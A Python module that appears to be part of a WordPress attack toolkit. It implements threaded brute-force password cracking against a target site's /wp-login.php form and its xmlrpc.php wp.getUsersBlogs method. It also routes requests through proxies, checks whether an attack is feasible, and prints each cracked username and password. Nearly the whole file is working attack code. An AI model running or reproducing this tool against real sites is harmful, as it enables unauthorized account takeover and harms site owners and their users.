"""
This Package is responsible to crack password for usernames via brute force approach.
The global parameters are available to modify at config.py - under the "bruteforce_data".
:global success: this is the success string that saying "logged in successfully"
:global num_of_threads: the default num of threads.
:global error_limit: this is the number of failre request to determinate that the method is not possible for brute force.
:global wp_admin: the path to the admin page
:global test_cookie: the testing cookie string.
:requirements: python3.X, asyncio, datetime, requests, urllib3, imaplib, time, threading, Queue, ThreadPoolExecutor, ElementTree, urllib.parse
"""

try:
    import enum
    import threading
    from Lib.queue import Queue as BlockingQueue
    from concurrent.futures.thread import ThreadPoolExecutor
    import xml.etree.ElementTree as ET

    from config import bruteforce_data, logs
    from wordpress import WPDetector, WPEnumerator
    from http_handler import HTTPWithSession
except Exception as e:
    if 'logs' in dir():
        logs.save_log("Import Error: {}".format(e))
    print("Import Error: {}".format(e))

_SUCCESS = bruteforce_data.get("success", "httponly")
_NUM_OF_THREADS = bruteforce_data.get("num_of_threads", 1)
_ERROR_LIMIT = bruteforce_data.get("error_limit", 10)
_WP_ADMIN = bruteforce_data.get("wp_admin", "/wp-login.php")
_TEST_COOKIE = bruteforce_data.get("test_cookie", "wordpress_test_cookie=WP+Cookie+check")


class MatchResponse(enum.Enum):
    SUCCESS = 1
    FAILURE = 2
    ERROR_MSG = 3


class WPPassBruteforcer(object):
    """
    This class is an abstract method for serval brute force approach that allow to crack user name and
    password in Wordpress Systems.
    :method bruteforce: have default implementation.
    :method get_cracked_data: have default implementation.
    :method is_method_possible: have default implementation.
    """

    def __init__(self, domain, additional_data=None, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficiency.
        :param domain: the target URL
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        """
        self._url = "{}".format(domain).strip('/')
        self._additional_data = additional_data
        self._proxies = proxies
        self._errors = 0  # should make volatile var
        self._logs = logs
        self._wp_admin_url = "{}{}".format(domain, _WP_ADMIN).replace("//{}".format(_WP_ADMIN), "/{}".format(_WP_ADMIN))
        self._cracked_data = dict()
        self._passwords = set()
        self._username_q = BlockingQueue()
        self._enumerator = WPEnumerator(self._url, proxies=proxies)
        self._http = HTTPWithSession()

    def bruteforce(self, usernames, passwords, threads=_NUM_OF_THREADS, proxies=None):
        """
        Consider adding progress logging by adding additional parameters
        :param usernames: list of usernames
        :param passwords: list of passwords
        :param threads: Number of threads to use
        :param proxies: working via HTTP proxies. If None, the constructor's proxies are used (if any)
        :return: dictionary of username to successfully bruteforced password
        """
        try:
            if proxies is not None:
                self._proxies = proxies
            if threads <= 0:
                threads = 1
            print("Start Cracking data:")
            executor = ThreadPoolExecutor(max_workers=threads)
            active_threads = threading.active_count()
            try:
                self._errors = 0
                self._insert_username_queue(username_list=usernames)
                passwords = set(passwords)
                if threads > 0:
                    for i in range(0, threads):
                        executor.submit(self._run, passwords)
            except Exception as e:
                total_threads_opened = threading.active_count() - active_threads
                self._logs.save_log(e, "Error: executor has crushed, threads created: {}".format(total_threads_opened))
            finally:
                total_threads_opened = threading.active_count() - active_threads
                if total_threads_opened > 0:
                    executor.shutdown(wait=True)
                self._is_errors_exceeded_the_limit(print_error=True)
                print("\tFinish Cracking data.")
                return self.get_cracked_data()
        except Exception as e:
            print("Something went wrong, please check the logs file.", e)
            self._logs.save_log(e)

    def get_cracked_data(self):
        """
        dictionary of username to successfully bruteforced password
        :return:
        """
        return self._cracked_data

    def is_method_possible(self):
        """
        Returns whether the method that is implemented in the class is possible for the domain or not
        :return: boolean
        """
        try:
            is_data_available = len(self._cracked_data.items()) > 0
            if is_data_available:
                return True
            is_enumeration_possible = self._enumerator.is_enumeration_possible()
            is_errors_limit = self._is_errors_exceeded_the_limit(print_error=False)
            if is_enumeration_possible and not is_errors_limit:
                return self._test_possibility()
            return False
        except Exception as e:
            print("Something went wrong, please check the logs file.", e)
            self._logs.save_log(e,
                                "Error: could not test if brute force is possible on this site: {}".format(self._url))
            return False

    def _try(self, username, password, proxies=None):
        """
        This method will try single crack for giev username and password
        :param username: str
        :param password: str
        :return: boolean
        """
        raise NotImplementedError()

    def _test_possibility(self):
        """
        This method will test the possibility fo brute force approach on the given URL.
        :return: boolean
        """
        raise NotImplementedError()

    def _save(self, username, password):
        """
        This method will save cracked data of username and password.
        :param username: str
        :param password: str
        :return: None
        """
        self._cracked_data[username] = password

    def _insert_username_queue(self, username_list):
        """
        This method will insert username(s) to the cracking queue.
        :param username_list: list of username(s)
        :return: None
        """
        if type(username_list) is not list:
            username_list = list(username_list)
        for usr in username_list:
            try:
                self._username_q.put(usr)
            except Exception as e:
                self._logs.save_log(e, "Cannot put username: {} inside the usernames Q.".format(usr))

    def _run(self, passwords, proxies=None):
        """
        This is an runnable method for the threads.
        :return: None
        """
        try:
            while not self._username_q.empty():
                if self._is_errors_exceeded_the_limit(print_error=False):
                    break
                username = self._username_q.get(block=False)
                password = self._cracked_data.get(username, None)  # checking if user cracked before.
                if password is not None:
                    is_match = self._try(username, password, proxies)
                    if is_match == MatchResponse.SUCCESS:
                        continue  # continue to next user.
                    else:
                        self._cracked_data.pop(username)  # delete the user the match not relevant.
                self._crack(username, passwords, proxies)
        except Exception as e:
            self._logs.save_log(e, "Error: Thread ({}) has crushed.".format(threading.current_thread().getName()))

    def _crack(self, username, passwords, proxies=None):
        """
        This method will try set of passwords with single username, until match is found or no more
        passwords to try.
        :param username: str
        :param passwords: list
        :return: None
        """
        try:
            if username in self._cracked_data:
                return
            for pwd in passwords:
                not_possible = self._is_errors_exceeded_the_limit(print_error=False)
                if not_possible:
                    return
                is_match = self._try(username, pwd, proxies)
                if is_match == MatchResponse.SUCCESS:
                    self._save(username, pwd)
                    print("\t*** Cracked: {}: {}***".format(username, pwd))
                elif is_match == MatchResponse.ERROR_MSG:
                    print("\tCould not reach the login page or the site cookies: {}: {}".format(username, pwd))
                    self._errors += 1
                elif is_match == MatchResponse.FAILURE:
                    print("\tNot Cracked: {}: {}".format(username, pwd))
        except Exception as e:
            self._logs.save_log(e, "Error: _crack method crashed for username: {}".format(username))
            self._errors += 1

    def _is_errors_exceeded_the_limit(self, print_error=False):
        """
        This method check is the limit of errors exceeded, if yes probably the bruteforce not possible anymore.
        :param print_error: boolean (Print error or not)
        :return: boolean (exceeded or not)
        """
        result = False
        if self._errors >= _ERROR_LIMIT:
            result = True
            if print_error:
                print("The number of errors has exceeded the limit, please check the parameters given"
                      " - they probably do not allow strong force for this site.")
        return result


class WPLoginPageBruteforcer(WPPassBruteforcer):
    """
    This class is implement the traditional login Brute Force via the login page of wordpress.
    :method bruteforce: override to do some changes and use the super in the end.
    :method _try: override and implement.
    :method _test_possibility: override and implement.
    """

    def __init__(self, domain, additional_data=None, proxies=None):
        super().__init__(domain, additional_data, proxies)

    def bruteforce(self, usernames, passwords, threads=_NUM_OF_THREADS, proxies=None, testmod=False):
        """
        :param usernames: list of usernames
        :param passwords: list of passwords
        :param threads: int (number of working thread)
        :param proxies: proxies (to use with the HTTP request, highly recommended)
        :param testmod: boolean (indicate if its for testing purpose or not)
        :return:
        """
        if not testmod:
            print("Start Bruteforce via Login Page for: {}".format(self._url))
            print("***** The following information is for testing purposes only, can be ignored *****")
            is_possible = self.is_method_possible()
            is_possible = is_possible and self.__check_login_page_params(proxies=proxies)
            print("***** Finish testing *****")
            if not is_possible:
                print("\tBruteforce via Login Page is not possible.")
                return self._cracked_data  # brute force is not possible.
            print("\tBruteforce via Login Page seems possible.")
        return super().bruteforce(usernames, passwords, threads, proxies)

    def _try(self, username, password, proxies=None):
        try:
            if proxies is None:
                proxies = self._proxies
            headers = {'Content-type': 'application/x-www-form-urlencoded',
                       'Cookie': _TEST_COOKIE}
            parameters = {'log': username, 'pwd': password, 'wp-submit': 'Login',
                          'testcookie': '1'}
            self._http.clean_session()
            response = self._http.request(url=self._wp_admin_url, method="POST", data=parameters, headers=headers,
                                          proxies=proxies, allow_redirects=True)
            if response is None:
                return MatchResponse.ERROR_MSG
            if response.status_code not in [200, 302, 301]:
                return MatchResponse.ERROR_MSG
            elif _TEST_COOKIE not in str(response.cookies):
                return MatchResponse.SUCCESS
        except Exception as e:
            self._logs.save_log(e, "Error: brute force failed for {}: {}".format(username, password))
            return MatchResponse.ERROR_MSG
        return MatchResponse.FAILURE

    def __check_login_page_params(self, proxies=None):
        if proxies is None:
            proxies = self._proxies
        if type(self) is not WPLoginPageBruteforcer.__class__:
            return True
        response = self._http.request(url="{}/{}".format(self._url, _WP_ADMIN), method="GET", proxies=proxies)
        if response is None:
            return False
        response = "{}".format(response.content)
        if "name=\"log\"" and "name=\"pwd\"" not in response:
            return False
        return True

    def _test_possibility(self):
        """
        This method is test if brute force aproach is possible, trying _ERROR_LIMIT times.
        if exceeded _ERROR_LIMIT errors, return not possible, other wise return possible.
        :return:
        """
        usernames = []
        passwords = ["123"]
        for i in range(0, _ERROR_LIMIT + 1):
            usernames.append(str(i))
        self.bruteforce(usernames=usernames, passwords=passwords, threads=0, testmod=True)
        return not self._is_errors_exceeded_the_limit(print_error=False)


class WPXmlrpcBruteforcer(WPLoginPageBruteforcer):
    """
    This class is implement the login Brute Force via the XML api of wordpress.
    :method _try: override and implement.
    """

    def __init__(self, domain, additional_data=None, proxies=None):
        super().__init__(domain, additional_data, proxies)
        self._wp_admin_url = "{}/xmlrpc.php".format(self._url)

    def _try(self, username, password, proxies=None):
        try:
            if proxies is None:
                proxies = self._proxies
            payload_param = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" \
                            "{}</value></param><param><value>{}</value></param></params></methodCall>"\
                .format(username, password)
            headers = {'Content-Type': 'application/xml'}  # set what your server accepts
            response = self._http.request(url=self._wp_admin_url, method="POST", data=payload_param, headers=headers,
                                          proxies=proxies)
            if response is None:
                return MatchResponse.FAILURE
            data = ET.fromstring(response.text)
            is_connected = data.find('params')
            if is_connected is None:
                return MatchResponse.FAILURE
            is_connected = is_connected.text
            if is_connected is None:
                return MatchResponse.FAILURE
            return MatchResponse.SUCCESS
        except Exception as e:
            self._logs.save_log(e, "Error: brute force failed for {}: {}".format(username, password))
            return MatchResponse.ERROR_MSG
